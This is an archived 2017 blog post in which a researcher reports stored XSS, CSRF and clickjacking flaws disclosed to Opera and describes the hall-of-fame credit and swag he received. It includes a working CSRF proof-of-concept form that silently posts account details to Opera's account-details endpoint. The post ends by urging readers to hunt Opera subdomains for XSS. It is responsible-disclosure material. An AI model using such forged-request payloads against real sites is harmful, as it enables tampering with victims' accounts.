---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-01_stored-xss-csrf-and-clickjacking-vulnerabilities-in-opera.md
original_filename: 2017-06-01_stored-xss-csrf-and-clickjacking-vulnerabilities-in-opera.md
title: Stored XSS, CSRF And Clickjacking Vulnerabilities in Opera
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- clickjacking
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- clickjacking
language: en
raw_sha256: 42415ff9392d6b59e9e4ce78b42e39c864962103f52741c568fd6a88d357eea3
text_sha256: 7b426b2b097863b470e63bb943327bd1270a9d432f59a4d66b9bb5d01be9eefe
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS, CSRF And Clickjacking Vulnerabilities in Opera

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-01_stored-xss-csrf-and-clickjacking-vulnerabilities-in-opera.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, clickjacking
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `42415ff9392d6b59e9e4ce78b42e39c864962103f52741c568fd6a88d357eea3`
- Text SHA256: `7b426b2b097863b470e63bb943327bd1270a9d432f59a4d66b9bb5d01be9eefe`


## Content

---
title: "Stored XSS, CSRF And Clickjacking Vulnerabilities in Opera"
page_title: "Stored XSS, CSRF And Clickjacking Vulnerabilities in Opera - Miscellaneous Ramblings of a Cyber Security Researcher"
url: "https://www.rafaybaloch.com/2017/06/stored-xss-csrf-and-clickjacking.html"
final_url: "https://www.rafaybaloch.com/2017/06/stored-xss-csrf-and-clickjacking.html"
authors: ["Rafay Baloch (@rafaybaloch)"]
programs: ["Opera"]
bugs: ["Stored XSS", "CSRF", "Clickjacking"]
publication_date: "2017-06-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6186
---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8M4K9vd-TKX0KQ46Q_GFm4az2EqmJiVGOX9XU-n6v_s-TMbLWoyJAEhl68cAKRwb__KmqxehglJJqBY7yLXOHKHKdf5DwAuNArqZaCwP-UQv5Vq9UWplZI0QGgWnMdueOJSiv659s8d8/s320/Opera.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8M4K9vd-TKX0KQ46Q_GFm4az2EqmJiVGOX9XU-n6v_s-TMbLWoyJAEhl68cAKRwb__KmqxehglJJqBY7yLXOHKHKdf5DwAuNArqZaCwP-UQv5Vq9UWplZI0QGgWnMdueOJSiv659s8d8/s1600/Opera.jpg)

  
Now a days, I am not much active in bug bounty programs, However, still i wanted to share my experience with Opera, Opera does not have a bug bounty program, However they certainly have their own way of thanking researchers by sending them some swag and listing their name under Hall of fame.  
  
I reported few vulnerabilities to opera including a Stored XSS, CSRF and a clickjacking vulnerability. The POC's for the vulnerabilities are as follows:  
  
**Stored XSS**  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCTnbHsUbn3oaRj2vj0z97ETazWiVxHnC_0zFescb48Ir485IKZulyzDRP3KkLBNmW0zvQeJJCPWCumqK0OEKnh0-ddFwrFBbW6sMVHWaSDDg0tq_XlfkRlEeS3MjyOWfzJAxwgF9bvI4/s640/OPERA.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCTnbHsUbn3oaRj2vj0z97ETazWiVxHnC_0zFescb48Ir485IKZulyzDRP3KkLBNmW0zvQeJJCPWCumqK0OEKnh0-ddFwrFBbW6sMVHWaSDDg0tq_XlfkRlEeS3MjyOWfzJAxwgF9bvI4/s1600/OPERA.png)

  
The **"Username"** input was not being sanitized properly, Which resulted in an execution of javascript.  
**  
****CSRF POC**  
**  
**The form was missing with CSRF tokens, An attacker could have used a CSRF attack in order to manipulate the form details.  
**  
****POC**  

  

_< html>_  
__  
_ <body>_  
_ <form action="https://apps.opera.com/en_pk/account.php?action=details" method="POST">_  
_ <input type="hidden" name="email" value="rafaybaloch&#64;gmail&#46;com" />_  
_ <input type="hidden" name="name" value="Rafay&#32;Baloch" />_  
_ <input type="hidden" name="address1" value="f&#45;10&#44;afasf&#32;afs&#32;asf&#32;1&#44;block&#32;15&#32;near&#32;income&#32;tax&#32;office&#44;asssssss&#45;e&#45;johar" />_  
_ <input type="hidden" name="address2" value="" />_  
_ <input type="hidden" name="city" value="Karachi" />_  
_ <input type="hidden" name="state" value="" />_  
_ <input type="hidden" name="country" value="PK" />_  
_ <input type="hidden" name="zip" value="44000" />_  
_ <input type="hidden" name="phone" value="&#43;923333333333" />_  
_ <input type="submit" value="Submit form" />_  
_ </form>_  
_ </body>_  
_< /html>_  
  
**Opera Hall Of Fame**  
  
So, For my findings, Opera listed my name under their hall of fame:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMwNVWe6JxL-3eiXBeLa3jaKN8HW89LpTLWWTHX_lIWnFaM81yBy_0_CX7TjlpD74uMUiBGBv1obbqdjCwKFKK03mKTpilgkHK94qSxdSZm8xb54xgl_2hROVx_GUhY1W3gkXTTtHQOt0/s640/164685_10151461794588001_940281350_n.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMwNVWe6JxL-3eiXBeLa3jaKN8HW89LpTLWWTHX_lIWnFaM81yBy_0_CX7TjlpD74uMUiBGBv1obbqdjCwKFKK03mKTpilgkHK94qSxdSZm8xb54xgl_2hROVx_GUhY1W3gkXTTtHQOt0/s1600/164685_10151461794588001_940281350_n.jpg)

  
**  
****Gift from Opera**  
**  
**As a token of appreciation, they also send me the following gifts:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi941iDdU8mdADljrdfa6VenEqprhRmC4oKfMHacBYWkbO1kikTGNZXAq979S7co8a474ogSNBjIXgD74hWXUhmR69gpGRRuZ3qUQQ26O2as0hv4wWPFxhwdVggybDsq6hCTi7n6ui9u6Y/s640/WP_20130417_002.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi941iDdU8mdADljrdfa6VenEqprhRmC4oKfMHacBYWkbO1kikTGNZXAq979S7co8a474ogSNBjIXgD74hWXUhmR69gpGRRuZ3qUQQ26O2as0hv4wWPFxhwdVggybDsq6hCTi7n6ui9u6Y/s1600/WP_20130417_002.jpg)

  

Opera is still sending some good stuff, I would recommend researchers to start looking opera's subdomains for low hanging fruits such as XSS, I know there is a lot of vulnerabilities out there unfixed.
